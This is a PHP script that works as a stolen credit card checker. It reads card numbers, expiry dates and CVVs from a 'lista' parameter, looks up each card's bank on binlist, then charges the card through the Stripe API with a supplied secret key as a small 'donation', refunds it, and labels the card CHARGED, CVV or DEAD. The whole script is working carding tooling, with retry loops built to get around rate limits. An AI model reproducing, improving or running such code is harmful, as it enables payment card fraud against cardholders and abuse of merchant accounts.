<?php



error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };

$chr = $_GET['cst'];
if(empty($chr)) {
$chr = '1';
}
$chr = $chr*100;

$sk = $_GET['sec'];
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
#############################
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
 $bin = 'Credit';
}else {
 $bin = 'Debit';
}

#-------------------[1st REQ]--------------------#
for ($retry = 0; $retry <= 100; $retry++)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]=');
$payments = curl_exec($ch); 
curl_close($ch);

$tok1 = Getstr($payments,'"id": "','"');

$payment_decode = json_decode($payments, 1);
$payment_id = $payment_decode['id'];
$payment_error_code = $payment_decode['error']['code'];
$payment_decline_code = $payment_decode['error']['decline_code'];
$payment_message = $payment_decode['error']['message'];
$payment_cvc_check = $payment_decode['card']['cvc_check'];

if ($payment_error_code != 'rate_limit') {
    break;
}
}

#-------------------[2nd REQ]--------------------#
for ($retry = 0; $retry <= 100; $retry++)
{
if (isset($payment_id)) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=rara Donation&payment_method='.$tok1.'&confirm=true&off_session=true');
$intents = curl_exec($ch); 
curl_close($ch);

$intent_decode = json_decode($intents, 1);
$intent_id = $intent_decode['id'];
$intent_error_code = $intent_decode['error']['code'];
$intent_decline_code = $intent_decode['error']['decline_code'];
$intent_message = $intent_decode['error']['message'];
}
if ($intent_error_code != 'rate_limit') {
    break;
}
}





 $refunds = Getstr($intents,'/v1/charges/','/refunds');

#############REFUND TEST
for ($retry = 0; $retry <= 100; $retry++)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$refunds.'&amount='.$chr.'&reason=requested_by_customer');
$refund = curl_exec($ch); 
curl_close($ch);

$payment_decode = json_decode($refund, 1);
$refund1 = $payment_decode['id'];
$refund2 = $payment_decode['error']['code'];
$refund3 = $payment_decode['error']['decline_code'];
$refund4 = $payment_decode['error']['message'];
$refund5 = $payment_decode['card']['cvc_check'];

if ($refund2 != 'rate_limit') {
    break;
}
}
#################


$receipt_url = Getstr($intents,'"receipt_url": "','"');

$country = Getstr($intents,'"country": "','"');

##========[RESPONSE CURL]========##

if (strpos($intents, '"status": "succeeded"')) {
    echo "<font color=blue>#CHARGED [R3][$lista]<br>[Receipt : <a href=$receipt_url>Here</a>][country:$country][$retry]<br>";
    die();
}


if (strpos($intents, '"status": "requires_source_action"')) {
    echo "<font color=red>#DEAD [R2] $listta [requires_source_action][OTP BIN][country:$country][$retry]<br>";

    die();
}

if (strpos($intents, '"status": "requires_action"')) {
    echo "<font color=red>#DEAD [R2] [$lista]<br>[requires_action][OTP BIN][country:$country][$retry]<br>";
    die();
}

if (!$payment_id) {
    if ($payment_error_code == 'insufficient_funds') {
        echo "<font color=green>#CVV [R1] [$lista]<br>[$payment_error_code]  [country:$country][$retry]<br>";
        die();
    }
    else if ($payment_decline_code == 'insufficient_funds') {
        echo "<font color=green>#CVV [R1] [$lista]<br>[$payment_decline_code]  [country:$country][$retry]<br>";
        die();
    }
    else if (strpos($payments, 'Invalid API Key provided')) {
        echo "<font color=red>#DEAD [R1] [$lista]<br>[Invalid API Key provided] [country:$country][$retry]<br>";
        die();
    }
    else if (!$payment_decline_code) {
        echo "<font color=red>#DEAD [R1] [$lista]<br>[$payment_message]  [country:$country][$retry]<br>";
        die();
    }
    else {
        echo "<font color=red>#DEAD [R1] [$lista]<br>[$payment_decline_code]  [country:$country][$retry]<br>";
        die();
    }
    die();
}




if (!$intent_id) {
    if ($intent_error_code == 'insufficient_funds') {
        echo "<font color=green>#CVV [R2] [$lista]<br>[$intent_error_code]  [country:$country][$retry]<br>";
        die();
    }
    else if ($intent_decline_code == 'insufficient_funds') {
        echo "<font color=green>#CVV [R2] [$lista]<br>[$intent_decline_code]  [country:$country][$retry]<br>";
        die();
    }
    if ($intent_error_code == 'transaction_not_allowed') {
        echo "#CVV [R2] [$lista]<br>[$intent_error_code]  [country:$country][$retry]<br>";
        die();
    }
    
    else if (!$intent_decline_code) {
        echo "<font color=red>#DEAD [R2] [$lista]<br>[$intent_error_code]  [country:$country][$retry]<br>"; 
        die();
    }
    else {
        echo "<font color=red><font color=red>#DEAD [R2] [$lista]<br>[$intent_decline_code][country:$country][$retry]<br>"; 
        die();
    }
    die();
}


curl_close($ch);
ob_flush();
?>